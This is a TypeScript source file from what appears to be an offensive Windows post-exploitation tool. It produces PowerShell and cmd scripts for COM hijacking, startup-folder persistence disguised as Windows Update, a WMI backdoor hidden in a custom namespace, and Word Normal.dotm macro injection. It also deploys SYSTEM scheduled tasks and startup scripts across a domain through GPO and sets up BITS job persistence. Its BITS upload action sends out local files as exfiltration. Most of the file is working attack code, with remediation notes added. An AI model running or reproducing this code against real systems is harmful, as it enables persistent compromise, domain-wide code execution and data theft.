Set-ItemProperty -Path $hkcuPath -Name 'ThreadingModel' -Value 'Both'

Write-Output "[+] COM hijack set:"
Write-Output "    CLSID: $clsid"
Write-Output "    DLL: $dllPath"
Write-Output "    Original: $hklmDll"
Write-Output "    [!] DLL will load when any process instantiates this COM object"

# Verify
$verify = (Get-ItemProperty $hkcuPath -ErrorAction SilentlyContinue).'(Default)'
Write-Output "[+] Verified: $verify"
`
  const result = await ps(script, timeout)
  output.push(result.stdout)
  if (action === "hijack" && result.stdout.includes("[+] COM hijack set")) {
    findings.push({
      checkId: "WIN-PERSIST-032",
      provider: "windows",
      severity: "critical",
      status: "DEPLOYED",
      resource: `com://${clsid}`,
      title: `COM object hijacked: ${clsid}`,
      details: `DLL: ${dllPath}`,
      remediation: `Remove: Remove-Item "HKCU:\\SOFTWARE\\Classes\\CLSID\\${clsid}" -Recurse -Force`,
    })
  }
  if (action === "scan") {
    const count = (result.stdout.match(/HIJACKABLE:/g) || []).length
    if (count > 0) {
      findings.push({
        checkId: "WIN-PERSIST-033",
        provider: "windows",
        severity: "info",
        status: "ENUMERATED",
        resource: "com://scan",
        title: `${count} hijackable COM objects found`,
        details: "CLSIDs registered in HKLM but not HKCU — user can override without admin",
        remediation: "Monitor HKCU\\SOFTWARE\\Classes\\CLSID for unauthorized entries",
      })
    }
  }
  return { output: output.join("\n"), findings }
}

export async function startupPersist(args: string[], timeout: number): Promise<HookResult> {
  const method = argVal(args, "--method") || "startup"
  const payload = argVal(args, "--payload")
  const target = argVal(args, "--target") || "USER"
  const findings: Finding[] = []
  const output: string[] = [`[*] Startup persistence: ${method}\n`]

  if (!payload) return { output: "[!] Required: --method METHOD --payload PATH", findings }

  if (activeExec === "cmd" || activeExec === "bat") {
    output.push("=== Startup Persistence (cmd.exe) ===\n")
    if (method === "startup" || !method) {
      const startupDir =
        target === "ALL"
          ? "%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
          : "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
      const r = await cmd(`copy "${payload}" "${startupDir}\\WindowsUpdate.exe" /Y`, timeout)
      output.push(
        r.exitCode === 0
          ? `[+] Payload copied to startup folder\n    Path: ${startupDir}\\WindowsUpdate.exe\n    Scope: ${target}`
          : `[!] Copy failed: ${r.stderr}\n[*] Alternative: use shortcut via PS or direct copy`,
      )
      if (r.exitCode === 0)
        findings.push({
          checkId: "WIN-PERSIST-006",
          provider: "windows",
          severity: "critical",
          status: "DEPLOYED",
          resource: `startup://${method}`,
          title: `Startup persistence: ${method}`,
          details: `Payload: ${payload}, Scope: ${target}`,
          remediation: `Delete: del "${startupDir}\\WindowsUpdate.exe"`,
        })
    }
    if (method === "gpo_script") {
      const scriptDir =
        target === "ALL"
          ? "%SystemRoot%\\System32\\GroupPolicy\\Machine\\Scripts\\Startup"
          : "%SystemRoot%\\System32\\GroupPolicy\\User\\Scripts\\Logon"
      await cmd(`mkdir "${scriptDir}" 2>nul`, timeout)
      const r = await cmd(`copy "${payload}" "${scriptDir}\\update.bat" /Y`, timeout)
      output.push(r.exitCode === 0 ? `[+] GPO script placed: ${scriptDir}\\update.bat` : `[!] Failed: ${r.stderr}`)
      const gpupdate = await cmd("gpupdate /force", timeout)
      output.push(gpupdate.exitCode === 0 ? "[+] GPO updated" : "[!] gpupdate failed")
      if (r.exitCode === 0)
        findings.push({
          checkId: "WIN-PERSIST-034",
          provider: "windows",
          severity: "critical",
          status: "DEPLOYED",
          resource: `startup://gpo_script`,
          title: `GPO startup script persistence`,
          details: `Payload: ${payload}, Scope: ${target}`,
          remediation: `Delete script from GPO path`,
        })
    }
    if (method === "wmi_namespace" || method === "office_macro") {
      output.push(`[*] ${method} requires PowerShell — use PS exec mode for full support`)
      output.push("[*] cmd.exe alternatives:")
      output.push("    startup: copy payload to Startup folder")
      output.push("    gpo_script: copy payload to GPO Scripts directory")
    }
    return { output: output.join("\n"), findings }
  }

  const methods: Record<string, string> = {
    startup: `
# Startup folder shortcut
$startupPath = if ("${target}" -eq "ALL") {
  "$env:ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
} else {
  "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
}

$shortcutPath = Join-Path $startupPath "WindowsUpdate.lnk"
$ws = New-Object -ComObject WScript.Shell
$shortcut = $ws.CreateShortcut($shortcutPath)
$shortcut.TargetPath = "${payload}"
$shortcut.WindowStyle = 7  # Minimized
$shortcut.Description = "Windows Update Service"
$shortcut.Save()

Write-Output "[+] Startup shortcut created:"
Write-Output "    Path: $shortcutPath"
Write-Output "    Target: ${payload}"
Write-Output "    Scope: ${target}"
`,
    gpo_script: `
# Group Policy logon/startup scripts
$gpoPath = if ("${target}" -eq "ALL") {
  "$env:SystemRoot\\System32\\GroupPolicy\\Machine\\Scripts\\Startup"
} else {
  "$env:SystemRoot\\System32\\GroupPolicy\\User\\Scripts\\Logon"
}

if (-not (Test-Path $gpoPath)) { New-Item -Path $gpoPath -ItemType Directory -Force | Out-Null }

# Copy payload
$destName = "update_$(Get-Random -Maximum 9999).bat"
$dest = Join-Path $gpoPath $destName
Copy-Item "${payload}" $dest -Force
Write-Output "[+] Script placed: $dest"

# Register in scripts.ini
$iniPath = Join-Path (Split-Path $gpoPath) "scripts.ini"
$section = if ("${target}" -eq "ALL") { "[Startup]" } else { "[Logon]" }
$existing = if (Test-Path $iniPath) { Get-Content $iniPath } else { @() }
$count = ($existing | Where-Object { $_ -match '^\\d+CmdLine=' }).Count
$entry = @("$($count)CmdLine=$dest", "$($count)Parameters=")
Add-Content $iniPath ($section + "\`r\`n" + ($entry -join "\`r\`n"))
Write-Output "[+] Registered in scripts.ini: $iniPath"

# Force GPO update
gpupdate /force 2>$null | Out-Null
Write-Output "[+] GPO updated"
`,
    wmi_namespace: `
# WMI namespace backdoor — persistent consumer in non-default namespace
$ns = "root\\cs_persist"

# Create namespace if needed
try {
  $nsObj = [wmiclass]"root:__Namespace"
  $newNs = $nsObj.CreateInstance()
  $newNs.Name = "cs_persist"
  $newNs.Put() | Out-Null
  Write-Output "[+] WMI namespace created: $ns"
} catch { Write-Output "[*] Namespace may already exist" }

# Create permanent event consumer in custom namespace
$filter = Set-WmiInstance -Namespace $ns -Class __EventFilter -Arguments @{
  EventNamespace = 'root\\cimv2'
  Name = 'CSPersistFilter'
  QueryLanguage = 'WQL'
  Query = "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LogonSession'"
}
$consumer = Set-WmiInstance -Namespace $ns -Class CommandLineEventConsumer -Arguments @{
  Name = 'CSPersistConsumer'
  CommandLineTemplate = "${payload}"
}
Set-WmiInstance -Namespace $ns -Class __FilterToConsumerBinding -Arguments @{
  Filter = $filter
  Consumer = $consumer
} | Out-Null

Write-Output "[+] WMI namespace backdoor installed in $ns"
Write-Output "    Trigger: Logon event"
Write-Output "    Command: ${payload}"
Write-Output "    [!] Hidden in non-default namespace — most tools only check root\\subscription"
`,
    office_macro: `
# Office macro template injection
$templateDir = "$env:APPDATA\\Microsoft\\Templates"
$normalDotm = Join-Path $templateDir "Normal.dotm"

if (Test-Path $normalDotm) {
  # Backup
  Copy-Item $normalDotm "$normalDotm.bak" -Force
  Write-Output "[+] Backed up Normal.dotm"
}

# Create VBA macro payload
$vbaMacro = @"
Sub AutoOpen()
    Dim ws As Object
    Set ws = CreateObject("WScript.Shell")
    ws.Run "${payload}", 0, False
End Sub
Sub Document_Open()
    AutoOpen
End Sub
"@

# For Word templates, we need to inject via COM
try {
  $word = New-Object -ComObject Word.Application
  $word.Visible = $false
  $doc = $word.Documents.Open($normalDotm)
  $vbProj = $doc.VBProject
  $vbComp = $vbProj.VBComponents.Item("ThisDocument")
  $vbComp.CodeModule.AddFromString($vbaMacro)
  $doc.Save()
  $doc.Close()
  $word.Quit()
  Write-Output "[+] Macro injected into Normal.dotm"
  Write-Output "    Payload: ${payload}"
  Write-Output "    Trigger: Any Word document open"
} catch {
  Write-Output "[!] Office macro injection failed: $_"
  Write-Output "    Word may not be installed or VBA access restricted"
  Write-Output "    Check: Trust Center > Macro Settings > Trust access to VBA project"
}
`,
  }

  const script = methods[method] || methods.startup
  const result = await ps(script, timeout)
  output.push(result.stdout)
  if (result.stdout.includes("[+]")) {
    findings.push({
      checkId: "WIN-PERSIST-035",
      provider: "windows",
      severity: "critical",
      status: "DEPLOYED",
      resource: `startup://${method}`,
      title: `Startup persistence: ${method}`,
      details: `Payload: ${payload}, Scope: ${target}`,
      remediation: `Method-specific cleanup required — see output for paths`,
    })
  }
  return { output: output.join("\n"), findings }
}

export async function gpoAbuse(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "create_task"
  const gpoName = argVal(args, "--gpo")
  const command = argVal(args, "--command")
  const ouDn = argVal(args, "--ou")
  const findings: Finding[] = []
  const output: string[] = [`[*] GPO abuse — action: ${action}\n`]

  if (!gpoName) return { output: "[!] Required: --gpo GPO_NAME", findings }
  if (!command && action !== "link_gpo") return { output: "[!] Required: --command CMD", findings }

  if (activeExec === "cmd" || activeExec === "bat") {
    output.push("=== GPO Abuse (cmd.exe) ===\n")
    output.push("[*] GPO manipulation requires LDAP/AD access — limited in cmd.exe mode")
    if (action === "create_task" && command) {
      output.push("[*] Manual steps for GPO scheduled task injection:")
      output.push(`    1. Find GPO SysVol path: net share | findstr SYSVOL`)
      output.push(
        `    2. Navigate to: \\\\DOMAIN\\SYSVOL\\domain\\Policies\\{GPO_GUID}\\Machine\\Preferences\\ScheduledTasks\\`,
      )
      output.push(`    3. Create ScheduledTasks.xml with ImmediateTaskV2 node`)
      output.push(`    4. Command: ${command}`)
      output.push(`    5. Force update: gpupdate /force /target:computer`)
    }
    if (action === "add_script" && command) {
      output.push("[*] Attempting script placement via UNC path...")
      const sysvol = await cmd(`net share | findstr /i SYSVOL`, timeout)
      output.push(sysvol.stdout || "[!] SYSVOL share not found on this machine")
      output.push(`[*] To add startup script to GPO '${gpoName}':`)
      output.push(`    copy "${command}" "\\\\DOMAIN\\SYSVOL\\...\\Machine\\Scripts\\Startup\\"`)
      output.push(`    gpupdate /force`)
    }
    if (action === "link_gpo") {
      output.push("[*] GPO linking requires AD tools (dsmod, ldifde, or PS)")
      output.push(`[*] Alternative: dsmod ou "${ouDn}" -gplinkgpo "{GPO_GUID}"`)
    }
    findings.push({
      checkId: "WIN-GPO-CMD",
      provider: "windows",
      severity: "info",
      status: "GUIDANCE",
      resource: `gpo://${gpoName}`,
      title: `GPO abuse guidance (cmd mode)`,
      details: `Full GPO manipulation requires PS or AD tools. Action: ${action}`,
      remediation: "Use PowerShell exec mode for full GPO support",
    })
    return { output: output.join("\n"), findings }
  }

  if (action === "create_task") {
    const script = `
Write-Output "[*] Creating immediate scheduled task via GPO: ${gpoName}"

# Find the GPO
try {
    $searcher = New-Object System.DirectoryServices.DirectorySearcher
    $searcher.Filter = "(&(objectClass=groupPolicyContainer)(displayName=${gpoName}))"
    $searcher.PropertiesToLoad.AddRange(@("cn","gPCFileSysPath","displayName"))
    $gpo = $searcher.FindOne()

    if (-not $gpo) {
        Write-Output "[!] GPO '${gpoName}' not found"
        exit 1
    }

    $gpoPath = $gpo.Properties["gpcfilesyspath"][0]
    $gpoDN = $gpo.Path
    Write-Output "[+] GPO found: $($gpo.Properties['displayname'][0])"
    Write-Output "    SysVol path: $gpoPath"

    # Create ScheduledTasks.xml for immediate task
    $taskDir = "$gpoPath\\Machine\\Preferences\\ScheduledTasks"
    if (-not (Test-Path $taskDir)) {
        New-Item -ItemType Directory -Path $taskDir -Force | Out-Null
    }

    $taskGuid = [Guid]::NewGuid().ToString("B").ToUpper()
    $now = Get-Date -Format "yyyy-MM-dd HH:mm:ss"

    $xml = @"
<?xml version="1.0" encoding="utf-8"?>
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">
    <ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43AEB5B}" name="CyberStrike-Task" image="0" changed="$now" uid="$taskGuid" userContext="0" removePolicy="0">
        <Properties action="C" name="CyberStrike-Task" runAs="NT AUTHORITY\\SYSTEM" logonType="S4U">
            <Task version="1.2">
                <Principals>
                    <Principal id="Author">
                        <UserId>NT AUTHORITY\\SYSTEM</UserId>
                        <LogonType>S4U</LogonType>
                        <RunLevel>HighestAvailable</RunLevel>
                    </Principal>
                </Principals>
                <Actions>
                    <Exec>
                        <Command>cmd.exe</Command>
                        <Arguments>/c ${command}</Arguments>
                    </Exec>
                </Actions>
            </Task>
        </Properties>
    </ImmediateTaskV2>
</ScheduledTasks>
"@

    $xml | Out-File "$taskDir\\ScheduledTasks.xml" -Encoding UTF8
    Write-Output "[+] ScheduledTasks.xml written to GPO"
    Write-Output "    Task will execute as SYSTEM on next GPO refresh"
    Write-Output "    Force refresh: gpupdate /force /target:computer"

    # Update GPO version to trigger replication
    $gpoEntry = New-Object System.DirectoryServices.DirectoryEntry($gpoDN)
    $currentVersion = $gpoEntry.Properties["versionNumber"][0]
    $newVersion = [int]$currentVersion + 1
    $gpoEntry.Properties["versionNumber"][0] = $newVersion
    $gpoEntry.CommitChanges()
    Write-Output "[+] GPO version bumped: $currentVersion -> $newVersion"

    # Also update GPT.ini
    $gptIni = "$gpoPath\\GPT.INI"
    if (Test-Path $gptIni) {
        $content = Get-Content $gptIni -Raw
        $content = $content -replace 'Version=\\d+', "Version=$newVersion"
        $content | Out-File $gptIni -Encoding ASCII
        Write-Output "[+] GPT.INI updated"
    }

} catch {
    Write-Output "[!] Error: $_"
}
`
    const result = await ps(script, timeout)
    output.push(result.stdout)
    if (result.stdout.includes("written to GPO")) {
      findings.push({
        checkId: "WIN-GPO-005",
        provider: "windows",
        severity: "critical",
        status: "DEPLOYED",
        resource: `gpo://${gpoName}`,
        title: `Immediate scheduled task deployed via GPO: ${gpoName}`,
        details: `Command: ${command}, runs as SYSTEM on all machines linked to this GPO`,
        remediation: `Remove ScheduledTasks.xml from GPO SysVol path, revert GPO version`,
      })
    }
  }

  if (action === "add_script") {
    const script = `
Write-Output "[*] Adding startup script to GPO: ${gpoName}"

try {
    $searcher = New-Object System.DirectoryServices.DirectorySearcher
    $searcher.Filter = "(&(objectClass=groupPolicyContainer)(displayName=${gpoName}))"
    $searcher.PropertiesToLoad.AddRange(@("cn","gPCFileSysPath"))
    $gpo = $searcher.FindOne()

    if (-not $gpo) {
        Write-Output "[!] GPO '${gpoName}' not found"
        exit 1
    }

    $gpoPath = $gpo.Properties["gpcfilesyspath"][0]
    Write-Output "[+] GPO SysVol: $gpoPath"

    # Create startup script directory
    $scriptDir = "$gpoPath\\Machine\\Scripts\\Startup"
    if (-not (Test-Path $scriptDir)) {
        New-Item -ItemType Directory -Path $scriptDir -Force | Out-Null
    }

    # Write the script
    $scriptName = "cs_startup.bat"
    "${command}" | Out-File "$scriptDir\\$scriptName" -Encoding ASCII
    Write-Output "[+] Startup script written: $scriptDir\\$scriptName"

    # Update scripts.ini
    $iniPath = "$scriptDir\\..\\scripts.ini"
    $iniContent = @"
[Startup]
0CmdLine=$scriptName
0Parameters=
"@
    $iniContent | Out-File $iniPath -Encoding ASCII
    Write-Output "[+] scripts.ini updated"

    # Bump GPO version
    $gpoDN = $gpo.Path
    $gpoEntry = New-Object System.DirectoryServices.DirectoryEntry($gpoDN)
    $v = [int]$gpoEntry.Properties["versionNumber"][0] + 1
    $gpoEntry.Properties["versionNumber"][0] = $v
    $gpoEntry.CommitChanges()
    Write-Output "[+] GPO version bumped to $v"

} catch {
    Write-Output "[!] Error: $_"
}
`
    const result = await ps(script, timeout)
    output.push(result.stdout)
    if (result.stdout.includes("script written")) {
      findings.push({
        checkId: "WIN-GPO-007",
        provider: "windows",
        severity: "critical",
        status: "DEPLOYED",
        resource: `gpo://${gpoName}`,
        title: `Startup script added to GPO: ${gpoName}`,
        details: `Script executes at machine startup for all linked OUs`,
        remediation: "Remove startup script from GPO SysVol, audit GPO modifications",
      })
    }
  }

  if (action === "link_gpo") {
    if (!ouDn) return { output: output.join("\n") + "\n[!] Required: --ou OU_DN", findings }
    const script = `
Write-Output "[*] Linking GPO '${gpoName}' to OU: ${ouDn}"

try {
    # Find GPO DN
    $searcher = New-Object System.DirectoryServices.DirectorySearcher
    $searcher.Filter = "(&(objectClass=groupPolicyContainer)(displayName=${gpoName}))"
    $searcher.PropertiesToLoad.AddRange(@("distinguishedName","cn"))
    $gpo = $searcher.FindOne()

    if (-not $gpo) {
        Write-Output "[!] GPO '${gpoName}' not found"
        exit 1
    }

    $gpoDN = $gpo.Properties["distinguishedname"][0]
    $gpoCN = $gpo.Properties["cn"][0]
    Write-Output "[+] GPO DN: $gpoDN"

    # Add gpLink to OU
    $ou = New-Object System.DirectoryServices.DirectoryEntry("LDAP://${ouDn}")
    $currentLinks = $ou.Properties["gpLink"].Value
    $newLink = "[LDAP://$gpoDN;0]"

    if ($currentLinks) {
        $ou.Properties["gpLink"].Value = "$currentLinks$newLink"
    } else {
        $ou.Properties["gpLink"].Value = $newLink
    }
    $ou.CommitChanges()
    Write-Output "[+] GPO linked to OU successfully"
    Write-Output "    Link: $newLink"
    Write-Output "    Enforcement: not enforced (0)"

} catch {
    Write-Output "[!] Error: $_"
}
`
    const result = await ps(script, timeout)
    output.push(result.stdout)
    if (result.stdout.includes("linked to OU")) {
      findings.push({
        checkId: "WIN-GPO-003",
        provider: "windows",
        severity: "critical",
        status: "DEPLOYED",
        resource: `gpo://${gpoName}`,
        title: `GPO linked to OU: ${ouDn}`,
        details: `GPO ${gpoName} now applies to all objects in the target OU`,
        remediation: `Remove gpLink from OU: ${ouDn}`,
      })
    }
  }

  return { output: output.join("\n"), findings }
}

export async function bitsPersist(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "list"
  const name = argVal(args, "--name") || "WindowsUpdateCheck"
  const url = argVal(args, "--url")
  const command = argVal(args, "--command")
  const localFile = argVal(args, "--local-file")
  const interval = argVal(args, "--interval") || "60"
  const findings: Finding[] = []
  const output: string[] = ["[*] BITS persistence operations...\n"]

  if (activeExec === "cmd" || activeExec === "bat") {
    output.push("=== BITS Persistence (cmd.exe) ===\n")
    if (action === "list") {
      const r = await cmd("bitsadmin /list /allusers /verbose", timeout)
      output.push(r.stdout || "(no BITS jobs found)")
      const hasSuspicious = r.stdout.includes("NOTIFICATION COMMAND LINE")
      if (hasSuspicious)
        findings.push({
          checkId: "WIN-BITS-001",
          provider: "windows",
          severity: "high",
          status: "SUSPICIOUS",
          resource: "bits://jobs",
          title: "BITS job with notification command found",
          details: "A BITS job has notification command configured — possible persistence",
          remediation: "Remove: bitsadmin /cancel JOB_NAME",
        })
    }
    if (action === "create") {
      if (!command) {
        output.push("ERROR: --command required")
        return { output: output.join("\n"), findings }
      }
      const downloadUrl = url || "https://live.sysinternals.com/autoruns.exe"
      const localPath = localFile || "%TEMP%\\update-check.tmp"
      const r1 = await cmd(`bitsadmin /create /download "${name}"`, timeout)
      output.push(r1.stdout || r1.stderr)
      const r2 = await cmd(`bitsadmin /addfile "${name}" "${downloadUrl}" "${localPath}"`, timeout)
      output.push(r2.stdout || r2.stderr)
      const r3 = await cmd(`bitsadmin /setnotifycmdline "${name}" "${command.split(" ")[0]}" "${command}"`, timeout)
      output.push(r3.stdout || r3.stderr)
      await cmd(`bitsadmin /setnotifyflags "${name}" 1`, timeout)
      await cmd(`bitsadmin /setminretrydelay "${name}" ${parseInt(interval) * 60}`, timeout)
      await cmd(`bitsadmin /setnoprogresstimeout "${name}" 0`, timeout)
      const resume = await cmd(`bitsadmin /resume "${name}"`, timeout)
      output.push(
        resume.exitCode === 0
          ? `[+] BITS persistence created: ${name}\n    Command: ${command}\n    Retry: every ${interval} min`
          : `[!] Resume failed: ${resume.stderr}`,
      )
      if (resume.exitCode === 0)
        findings.push({
          checkId: "WIN-BITS-010",
          provider: "windows",
          severity: "critical",
          status: "PERSISTED",
          resource: `bits://${name}`,
          title: `BITS persistence: ${name}`,
          details: `Command: ${command}, retry: ${interval} min`,
          remediation: `Remove: bitsadmin /cancel "${name}"`,
        })
    }
    if (action === "delete") {
      const r = await cmd(`bitsadmin /cancel "${name}"`, timeout)
      output.push(r.exitCode === 0 ? `[+] BITS job cancelled: ${name}` : `[!] Cancel failed: ${r.stderr}`)
    }
    if (action === "exfil") {
      if (!url || !localFile) {
        output.push("ERROR: --url and --local-file required")
        return { output: output.join("\n"), findings }
      }
      const r1 = await cmd(`bitsadmin /create /upload "${name}-exfil"`, timeout)
      const r2 = await cmd(`bitsadmin /addfile "${name}-exfil" "${url}" "${localFile}"`, timeout)
      const r3 = await cmd(`bitsadmin /resume "${name}-exfil"`, timeout)
      output.push(
        r3.exitCode === 0 ? `[+] BITS upload started: ${localFile} → ${url}` : `[!] Upload failed: ${r3.stderr}`,
      )
    }
    return { output: output.join("\n"), findings }
  }

  if (action === "list") {
    const script = `
Write-Output "=== BITS Transfer Jobs ==="

# List all BITS jobs (requires admin for other users' jobs)
$jobs = Get-BitsTransfer -AllUsers -ErrorAction SilentlyContinue
if (-not $jobs) {
  $jobs = Get-BitsTransfer -ErrorAction SilentlyContinue
}

if ($jobs) {
  $count = ($jobs | Measure-Object).Count
  Write-Output "JOBS_COUNT=$count"
  Write-Output ""
  foreach ($job in $jobs) {
    Write-Output "--- Job: $($job.DisplayName) ---"
    Write-Output "  JobId: $($job.JobId)"
    Write-Output "  Owner: $($job.OwnerAccount)"
    Write-Output "  State: $($job.JobState)"
    Write-Output "  Type: $($job.TransferType)"
    Write-Output "  Priority: $($job.Priority)"
    Write-Output "  Created: $($job.CreationTime)"
    Write-Output "  Modified: $($job.ModificationTime)"
    Write-Output "  BytesTransferred: $($job.BytesTransferred)"
    Write-Output "  BytesTotal: $($job.BytesTotal)"
    # Check for notification command (persistence indicator)
    $cmdLine = $job.NotifyCmdLine
    if ($cmdLine) {
      Write-Output "  [!] NotifyCmdLine: $cmdLine"
      Write-Output "  SUSPICIOUS=1"
    }
    Write-Output ""
  }
} else {
  Write-Output "No BITS jobs found"
  Write-Output "JOBS_COUNT=0"
}

# Check BITS service status
Write-Output "=== BITS Service ==="
$svc = Get-Service BITS
Write-Output "Status: $($svc.Status)"
Write-Output "StartType: $($svc.StartType)"

# Registry persistence check
$bitsReg = Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\BITS' -ErrorAction SilentlyContinue
if ($bitsReg) {
  Write-Output "MaxBandwidth: $($bitsReg.MaxBandwidthServed)"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)

    const countMatch = r.stdout.match(/JOBS_COUNT=(\d+)/)
    const hasSuspicious = r.stdout.includes("SUSPICIOUS=1")
    if (hasSuspicious) {
      findings.push({
        checkId: "WIN-BITS-011",
        provider: "windows",
        severity: "high",
        status: "SUSPICIOUS",
        resource: "bits://jobs",
        title: "BITS job with NotifyCmdLine found — possible persistence",
        details:
          "A BITS transfer job has a notification command configured, which executes when the job completes. This is a known persistence technique.",
        remediation: "Review and remove suspicious BITS jobs: Get-BitsTransfer -AllUsers | Remove-BitsTransfer",
      })
    }
  }

  if (action === "create") {
    if (!command) {
      output.push("ERROR: --command required for create action")
      return { output: output.join("\n"), findings }
    }
    const downloadUrl = url || "https://live.sysinternals.com/autoruns.exe"
    const localPath = localFile || "$env:TEMP\\update-check.tmp"
    const script = `
Write-Output "=== Creating BITS Persistence Job ==="
Write-Output "Name: ${name}"
Write-Output "Command: ${command}"
Write-Output ""

# Method 1: BITS job with NotifyCmdLine (survives reboots with BG_JOB_ENABLE_PERF_CACHING)
try {
  # Create download job (needs a valid URL to trigger completion)
  $job = Start-BitsTransfer -DisplayName '${name}' -Source '${downloadUrl}' -Destination '${localPath}' -Asynchronous -Priority Low

  # Set notification command to execute on completion
  # Uses COM interface for NotifyCmdLine
  $jobObj = [System.Runtime.InteropServices.Marshal]::CreateWrapperOfType($job, [Microsoft.BackgroundIntelligentTransfer.Management.BitsJob])

  Write-Output "[*] Job created: $($job.JobId)"
  Write-Output "[*] State: $($job.JobState)"
  Write-Output ""

  # Alternative: bitsadmin for notification command (more reliable)
  $jobId = $job.JobId
  bitsadmin /setnotifycmdline "{$jobId}" "${command.split(" ")[0]}" "${command}" 2>&1 | Out-Null
  bitsadmin /setnotifyflags "{$jobId}" 1 2>&1 | Out-Null
  bitsadmin /setminretrydelay "{$jobId}" ${parseInt(interval) * 60} 2>&1 | Out-Null
  bitsadmin /setnoprogresstimeout "{$jobId}" 0 2>&1 | Out-Null
  bitsadmin /resume "{$jobId}" 2>&1 | Out-Null

  Write-Output "[+] Persistence configured:"
  Write-Output "    Job: ${name} ($jobId)"
  Write-Output "    Trigger: On transfer completion/error"
  Write-Output "    Command: ${command}"
  Write-Output "    Retry: Every ${interval} minutes"
  Write-Output ""
  Write-Output "[*] Job will persist across reboots"
  Write-Output "[*] BITS service auto-starts on boot (Automatic trigger)"
  Write-Output ""
  Write-Output "Cleanup: winhook bits_persist --action delete --name '${name}'"
  Write-Output "STATUS=SUCCESS"
} catch {
  Write-Output "[-] PowerShell method failed: $_"
  Write-Output ""
  Write-Output "[*] Falling back to bitsadmin..."

  bitsadmin /create /download "${name}" 2>&1
  bitsadmin /addfile "${name}" "${downloadUrl}" "${localPath}" 2>&1
  bitsadmin /setnotifycmdline "${name}" "${command.split(" ")[0]}" "${command}" 2>&1
  bitsadmin /setnotifyflags "${name}" 1 2>&1
  bitsadmin /setminretrydelay "${name}" ${parseInt(interval) * 60} 2>&1
  bitsadmin /setnoprogresstimeout "${name}" 0 2>&1
  bitsadmin /resume "${name}" 2>&1

  Write-Output ""
  Write-Output "[+] BITS job created via bitsadmin"
  Write-Output "STATUS=SUCCESS"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)

    if (r.stdout.includes("STATUS=SUCCESS")) {
      findings.push({
        checkId: "WIN-BITS-012",
        provider: "windows",
        severity: "critical",
        status: "PERSISTED",
        resource: `bits://${name}`,
        title: `BITS persistence job created: ${name}`,
        details: `Command: ${command}, retry interval: ${interval} minutes. Job persists across reboots via BITS service auto-start.`,
        remediation: `Remove: winhook bits_persist --action delete --name '${name}'`,
      })
    }
  }

  if (action === "delete") {
    const script = `
Write-Output "=== Removing BITS Job ==="

# Try PowerShell first
$job = Get-BitsTransfer -AllUsers -ErrorAction SilentlyContinue | Where-Object { $_.DisplayName -eq '${name}' }
if ($job) {
  $job | Remove-BitsTransfer
  Write-Output "[+] Removed BITS job: ${name} ($($job.JobId))"
} else {
  # Try bitsadmin
  $result = bitsadmin /cancel "${name}" 2>&1
  if ($LASTEXITCODE -eq 0) {
    Write-Output "[+] Removed BITS job via bitsadmin: ${name}"
  } else {
    Write-Output "[-] Job '${name}' not found"
  }
}

# Clean up local file
if (Test-Path '${localFile || "$env:TEMP\\update-check.tmp"}') {
  Remove-Item '${localFile || "$env:TEMP\\update-check.tmp"}' -Force
  Write-Output "[+] Cleaned up local file"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
  }

  if (action === "exfil") {
    if (!url) {
      output.push("ERROR: --url required for exfil action (upload endpoint)")
      return { output: output.join("\n"), findings }
    }
    if (!localFile) {
      output.push("ERROR: --local-file required for exfil action")
      return { output: output.join("\n"), findings }
    }
    const script = `
Write-Output "=== BITS Data Exfiltration ==="
Write-Output "Source: ${localFile}"
Write-Output "Destination: ${url}"
Write-Output ""

try {
  # Upload job — BITS handles chunking, retry, and bandwidth throttling
  Start-BitsTransfer -Source '${localFile}' -Destination '${url}' -TransferType Upload -DisplayName '${name}-exfil' -Priority Low -Asynchronous
  Write-Output "[+] Upload job created"
  Write-Output "[*] BITS handles retry and bandwidth throttling automatically"
  Write-Output "[*] Transfer runs in background even if session disconnects"
  Write-Output ""
  Write-Output "[*] Monitor: bitsadmin /info '${name}-exfil' /verbose"
  Write-Output "STATUS=STARTED"
} catch {
  Write-Output "[-] Upload failed: $_"
  Write-Output ""
  Write-Output "[*] Alternative: Use bitsadmin"
  Write-Output "    bitsadmin /create /upload ${name}-exfil"
  Write-Output "    bitsadmin /addfile ${name}-exfil ${url} ${localFile}"
  Write-Output "    bitsadmin /resume ${name}-exfil"
  Write-Output "STATUS=FAILED"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
  }

  return { output: output.join("\n"), findings }
}

export async function wsusAbuse(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const findings: Finding[] = []
  const output: string[] = ["[*] WSUS exploitation analysis...\n"]

  if (activeExec === "cmd" || activeExec === "bat") {
    output.push("=== WSUS Analysis (cmd.exe) ===\n")
    if (action === "enum" || action === "check") {
      const wu = await cmd(
        `reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate" /v WUServer`,
        timeout,
      )
      const wuStatus = await cmd(
        `reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate" /v WUStatusServer`,
        timeout,
      )
      if (wu.exitCode === 0) {
        const wsusUrl = wu.stdout.match(/REG_SZ\s+(.+)/)?.[1]?.trim() || ""
        output.push(`[*] WSUS Server: ${wsusUrl}`)
        output.push(`[*] Status Server: ${wuStatus.stdout.match(/REG_SZ\s+(.+)/)?.[1]?.trim() || "N/A"}`)
        if (wsusUrl.startsWith("http://")) {
          output.push("\n[!] CRITICAL: WSUS uses HTTP — vulnerable to MITM update injection")
          output.push("[!] Tools: SharpWSUS, WSUSpendu for domain-wide SYSTEM execution")
          findings.push({
            checkId: "WIN-WSUS-001",
            provider: "windows",
            severity: "critical",
            status: "VULNERABLE",
            resource: wsusUrl,
            title: "WSUS over HTTP — update injection possible",
